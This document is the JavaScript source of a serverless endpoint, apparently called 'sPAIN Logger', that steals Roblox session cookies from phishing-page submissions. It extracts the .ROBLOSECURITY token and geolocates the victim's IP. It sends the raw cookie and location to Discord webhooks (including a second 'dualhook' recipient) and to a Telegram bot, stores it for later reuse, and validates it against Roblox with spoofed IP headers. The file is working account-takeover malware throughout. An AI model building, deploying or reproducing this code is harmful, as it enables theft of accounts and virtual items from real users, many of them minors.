// api/submit.js — sends cookie INSTANTLY, validates in background
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN;
const TG_CHAT     = process.env.TG_CHAT;

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch (e) { console.error('redisGet:', e.message); return null; }
}

async function redisSet(key, value) {
  try {
    const res = await fetch(`${REDIS_URL}/pipeline`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'Content-Type': 'application/json' },
      body: JSON.stringify([['SET', key, JSON.stringify(value), 'EX', 2592000]])
    });
    return res.ok;
  } catch { return false; }
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`,
      { signal: AbortSignal.timeout(3000) });
    const d = await r.json();
    return d.status === 'success' ? d : null;
  } catch { return null; }
}

async function tgSend(text) {
  if (!TG_TOKEN || !TG_CHAT) return;
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

function generateId() {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let id = '';
  for (let i = 0; i < 40; i++) id += chars[Math.floor(Math.random() * chars.length)];
  return id;
}

const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = String(raw).trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                     if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);                                 if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!r.ok) console.error('Discord failed:', r.status, await r.text());
  } catch (e) { console.error('discordSend:', e.message); }
}

async function discordChunked(url, text) {
  const limit = 1990;
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, limit); rem = rem.substring(limit);
    await discordSend(url, {
      content: first
        ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
        : chunk + (rem.length === 0 ? '\n```' : '')
    });
    first = false;
  }
}

// ── Step 1: send cookie INSTANTLY (no Roblox validation) ─────────────────────
async function sendInstant(webhookUrl, { cookie, ip, geo, now, pageName, refreshUrl }) {
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title:       '🍪 Cookie Captured',
      description: '🔥 `sPAIN` 🔥\n⚡ Validating in background...',
      color:       0xc026d3,
      fields: [
        { name: '🌐 IP',       value: ip || 'Unknown',                                                                     inline: true  },
        { name: '📍 Location', value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown',  inline: true  },
        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                               inline: true  },
        { name: '🕐 Time',     value: now,                                                                                  inline: false },
      ],
      footer:    { text: `sPAIN Logger • ${pageName}` },
      timestamp: now
    }]
  });
  // Raw cookie immediately
  await discordChunked(webhookUrl, cookie);
  // Refresh link
  await discordSend(webhookUrl, {
    content: `🔄 **Stats + PowerShell:** <${refreshUrl}>`
  });
}

// ── Step 2: follow-up embed after background validation ───────────────────────
async function sendValidated(webhookUrl, { username, id, valid, pageName, now }) {
  await discordSend(webhookUrl, {
    embeds: [{
      title:       valid ? `✅ Valid — ${username}` : '❌ Invalid / Expired Cookie',
      description: valid
        ? `[Profile](https://www.roblox.com/users/${id}/profile)`
        : 'Cookie was rejected by Roblox. Account may have logged out.',
      color:       valid ? 0x22c55e : 0xff3333,
      footer:      { text: `sPAIN Logger • ${pageName} • ${now}` },
      timestamp:   now
    }]
  });
}

async function sendNoToken(webhookUrl, { ip, geo, now, pageName }) {
  await discordSend(webhookUrl, {
    embeds: [{
      title: '⚠️ No cookie found in submission',
      color: 0xff6600,
      fields: [
        { name: '🌐 IP',       value: ip || 'Unknown',                                                                inline: true  },
        { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown',               inline: true  },
        { name: '🕐 Time',     value: now,                                                                              inline: false }
      ],
      footer: { text: `sPAIN Tools • ${pageName}` },
      timestamp: now
    }]
  });
}

// Background: validate cookie against Roblox
async function validateCookie(cookie, ip) {
  try {
    const h = {
      'Cookie':      `.ROBLOSECURITY=${cookie}`,
      'User-Agent':  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
      'Accept':      'application/json',
      'Referer':     'https://www.roblox.com/',
    };
    if (ip && ip !== 'Unknown') { h['X-Forwarded-For'] = ip; h['X-Real-IP'] = ip; }
    const r = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: h,
      signal: AbortSignal.timeout(8000)
    });
    if (!r.ok) return null;
    const d = await r.json();
    return d?.id ? { id: d.id, username: d.name } : null;
  } catch { return null; }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots } = body;
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });
  if (!REDIS_URL || !REDIS_TOKEN) return res.status(500).json({ error: 'Server config error' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: `Page "${slug}" not found` });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  // ── Respond to client immediately ─────────────────────────────────────────
  res.status(200).json({ success: true });

  // ── Everything below is fire-and-forget ───────────────────────────────────
  try {
    const ip       = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
                  || req.headers['x-real-ip'] || 'Unknown';
    const cookie   = findCookie(slots);
    const now      = new Date().toISOString();
    const pageName = record.displayName || slug;

    // Collect webhooks
    const webhooks = [record.webhook];
    if (record.dualhookParent) {
      try {
        const parent = await redisGet(`slot:${record.dualhookParent}`);
        if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
      } catch (_) {}
    }

    if (!cookie) {
      // No cookie — still get geo fast and notify
      const geo = await getIpGeo(ip);
      for (const wh of webhooks) await sendNoToken(wh, { ip, geo, now, pageName });
      await tgSend(`⚠️ <b>NO COOKIE — ${pageName}</b>\n🌐 <code>${ip}</code>`);
      return;
    }

    // Generate refresh ID upfront so URL is ready instantly
    const refreshId  = generateId();
    const refreshUrl = `https://spain-tools.vercel.app/api/refresh?id=${refreshId}`;

    // ── PARALLEL: geo lookup + instant Discord send + save to Redis ────────
    // Geo runs while we also immediately start sending cookie to Discord
    const [geo] = await Promise.all([
      getIpGeo(ip),
      // Save refresh record to Redis immediately (cookie is valid enough to save)
      redisSet(`refresh:${refreshId}`, {
        cookie,
        webhook:   record.webhook,
        webhook1:  webhooks[1] || null,
        pageName,
        ip,
        createdAt: now
      })
    ]);

    // ── INSTANT: send cookie + location to Discord RIGHT NOW ───────────────
    for (const wh of webhooks) {
      await sendInstant(wh, { cookie, ip, geo, now, pageName, refreshUrl });
    }

    await tgSend([
      `🍪 <b>COOKIE SENT — ${pageName}</b>`,
      `🌐 <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
      `🔄 ${refreshUrl}`
    ].join('\n'));

    // ── BACKGROUND: validate cookie and send follow-up embed ───────────────
    const user = await validateCookie(cookie, ip);
    const validNow = new Date().toISOString();

    for (const wh of webhooks) {
      await sendValidated(wh, {
        username: user?.username || 'Unknown',
        id:       user?.id,
        valid:    !!user,
        pageName,
        now:      validNow
      });
    }

    if (user) {
      await tgSend(`✅ <b>VALID — ${user.username} (${user.id})</b>\n📄 ${pageName}`);
    } else {
      await tgSend(`❌ <b>INVALID COOKIE — ${pageName}</b>`);
    }

  } catch (err) {
    console.error('Post-response error:', err.message);
  }
}
